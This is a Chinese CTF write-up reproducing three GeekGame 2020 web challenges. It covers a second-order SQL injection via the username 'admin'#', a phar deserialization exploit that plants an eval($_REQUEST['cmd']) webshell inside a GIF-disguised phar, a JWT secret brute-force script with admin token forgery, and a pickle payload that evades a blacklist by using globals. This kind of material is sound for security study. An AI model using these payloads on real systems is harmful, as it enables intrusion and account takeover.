# GeekGame 2020 WEB 复现


## 前言

被川大的同学叫来打这个比赛

嗯没错这次比赛非常神奇，水出来的 RE 和 Crypto 都比 WEB 多...

比赛的时候就做出来一道 WEB（真的菜



## 二次注入

真的是这次比赛最简单的一道题了

最常规的二次注入

先注册一个名为 `admin'#` 的用户，登录后修改密码

再用 `admin` 和修改后的密码登录即可

> 比赛的时候没发现有源码泄露，直接看 SQL 语句可能更直观一些
>
> ```php
> $x=$db->execute("update users set password=? where username='$username' ",['s',&$password]);
> ```



## 反序列化？

打开是个文件上传，只能上传图片，并且有个 `vulnerable.php` 

```php
<?php
highlight_file(__FILE__);
if (isset($_GET['filename'])) {
    $filename = $_GET['filename'];
} else {
    $filename = "";
}

class Flag
{
    private $code;

    function __destruct()
    {
        // TODO: Implement __destruct() method.
        eval($this->code);
    }
}

if (file_exists($filename)) {
    echo "文件存在的呢;";
} else {
    echo "啊这，文件不在哦";
}
?>
```

题名加了个问号，那就不是反序列化，但是还不知道怎么做

看了官方 WP，这真的涉及到我的知识盲区了

`vulnerable.php` 中用到了 `file_exists` 函数

> 自 PHP 5.0.0 起, 此函数也用于某些 URL 包装器
>
> `file_exists`函数在检查 phar 包的时候会将其解析

用如下 payload 生成 phar 包

```php
<?php

class Flag
{
    private $code;

    function __construct($my_code)
    {
        $this->code = $my_code;
    }

    function __destruct()
    {
        eval($this->code);
    }
}



$phar = new Phar('a.phar');
$phar->startBuffering();
$phar->setStub('GIF89a<?php __HALT_COMPILER();?>');
$object = new Flag('eval($_REQUEST["cmd"]);');
$phar->setMetadata($object);
$phar->addFromString('a.txt', 'a');
$phar->stopBuffering();
```

注意添加文件头绕过文件类型检测，生成后改后缀为 gif 上传，再用 phar 协议读取即可

```
vulnerable.php?filename=phar://upload/a.gif
```



## ezcode

直到比赛结束只有一解的题

打开可以注册和登录，注册返回一串 JWT，刚开始毫无思路，后来给了一个 hint

```
hint ：top1000
```

？top1000 弱口令吗

跑了一下果然跑出来了 key

```python
import jwt

token = 'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6IjEyMzQifQ.f_U2qBN5qFbsWyIQhfIGYw2aDzX1QTKefGn-QuZ8FIw'

with open('top1000.txt', 'r') as f:
    top1000 = [i.strip() for i in f.readlines()]
for i in top1000:
    test_token = jwt.encode({'username':'1234'}, algorithm='HS256', key=i).decode()
    if test_token == token:
        print('Found it!')
        print(i)
        print(jwt.encode({'username':'admin'}, algorithm='HS256', key=i).decode())
        break
```

![JWT](JWT.png "爆破 JWT Key 并修改内容")

用生成的 JWT 登录发现还有第二关，看一下源码有注释

```python
want2know=xxx

class RestrictedUnpickler(pickle.Unpickler):
    blacklist = {
        'sys','eval', 'exec', 'execfile', 'compile', 'open', 'input', '__import__', 'exit','getattr'
        }

    def find_class(self, module, name):
        # Only allow safe classes from builtins.
        if module == "builtins" and name not in self.blacklist:
            return getattr(builtins, name)
        # Forbid everything else.
        raise pickle.UnpicklingError("global '%s.%s' is forbidden" %
                                     (module, name))

def restricted_loads(s):
    return RestrictedUnpickler(io.BytesIO(s)).load()

...

        pickle_data=request.form.get('data')
        
        if pickle_data==None:
            return open('templates/pickle.html').read()

        try:
            pickle_data=base64.b64decode(pickle_data.encode())


            op_blackli=[b'R']

            for op in op_blackli:
                if op in pickle_data:
                    return '数据非法！'+op.decode()
            data=restricted_loads(pickle_data)

        except Exception:
            
            return "请输入正确的数据格式！"

        try:
            secret=request.form.get('secret')
        except Exception:
            return open('templates/pickle.html')
        
        if want2know==secret:
            return flag
        else:
            return '欢迎使用HACHp1的pickle测试工具！'
    else:
        return '没有权限查看！\n'
```

是一个 pickle 反序列化，只看出来禁止用 `R` 执行函数，然后就不会了（

看了 WP 这里是利用 `globals` 或 `locals` 函数直接修改 `want2know` 使其与输入的 `secret` 相等

出题壬推荐用 [pker](https://github.com/eddieivan01/pker) 构建序列化

```python
glo_dic=INST('builtins','globals')
glo_dic['want2know']='test'
return
```

生成 payload

```
b"(ibuiltins\nglobals\np0\n0g0\nS'want2know'\nS'test'\ns."
```

base64 一下即可



## 总结

第一道 WEB 比较照顾我这样的菜🐶

后两道 WEB 质量还是不错的，都涉及到了我不会的知识点

phar 和 pickle 似乎都是第一次做到

除了做不出来，体验挺不错的（
